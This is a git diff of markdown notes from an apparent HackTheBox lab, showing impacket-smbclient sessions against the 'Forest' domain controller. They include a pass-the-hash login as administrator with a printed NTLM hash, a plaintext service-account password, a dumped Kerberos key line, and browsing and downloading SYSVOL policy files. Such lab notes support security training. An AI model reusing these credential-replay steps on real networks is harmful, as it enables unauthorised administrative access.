@@ -702,16 +702,16 @@ SAUNA$:des-cbc-md5:623143264c38bac7
 
 ## smbclient
 ```sh
-┌──(kali㉿kali)-[~]
-└─$ impacket-smbclient -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6' 'htb.local/administrator:s3rvice@10.129.95.210'
+└─$ impacket-smbclient -debug 'htb.local/svc-alfresco:s3rvice@10.129.95.210'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
 Type help for list of commands
 #
 ```
 ### help
 ```sh
-help
+#help
 
  open {host,port=445} - opens a SMB connection against the target host/port
  login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
@@ -742,6 +742,21 @@ help
  close - closes the current SMB Session
  exit - terminates the server process (and this session)
 ```
+### logoff
+```sh
+# logoff
+#
+```
+### open
+```sh
+# open 10.129.95.210
+[*] SMBv3.0 dialect used
+```
+### login_hash
+```sh
+# login_hash htb.local/administrator :32693b11e6aa90eb43d32c72a07ceea6
+[*] USER Session Granted
+```
 ### shares
 ```sh
 # shares
@@ -755,7 +770,7 @@ SYSVOL
 ```sh
 # use SYSVOL
 ```
-### use
+### pwd
 ```sh
 # pwd
 /
@@ -767,12 +782,14 @@ drw-rw-rw-          0  Wed Sep 18 13:46:00 2019 .
 drw-rw-rw-          0  Wed Sep 18 13:46:00 2019 ..
 drw-rw-rw-          0  Wed Sep 18 13:46:00 2019 htb.local
 ```
+### cd
+```sh
+# cd htb.local
+#
+```
 ### tree
 ```sh
 # tree
-/htb.local/DfsrPrivate
-/htb.local/Policies
-/htb.local/scripts
 /htb.local/DfsrPrivate/ConflictAndDeleted
 /htb.local/DfsrPrivate/Deleted
 /htb.local/DfsrPrivate/Installing
@@ -795,4 +812,33 @@ drw-rw-rw-          0  Wed Sep 18 13:46:00 2019 htb.local
 /htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
 /htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
 /htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
+Finished - 25 files and folders
+```
+### cat
+```sh
+# cat /htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
+[+] Encoding detection: ascii is most likely the one.
+[General]
+Version=6
+```
+### get
+```sh
+# get /htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
+#
+```
+### info
+```sh
+# info
+Version Major: 10
+Version Minor: 0
+Server Name: FOREST
+Server Comment: 
+Server UserPath: c:\
+Simultaneous Users: 16777216
+```
+### who
+```
+# who
+host:   \\10.10.16.20, user: administrator, active:  1209, idle:     0
+host: \\[fe80::8ac:ee0f:f73e:1363], user: FOREST$, active:     8, idle:     8
 ```
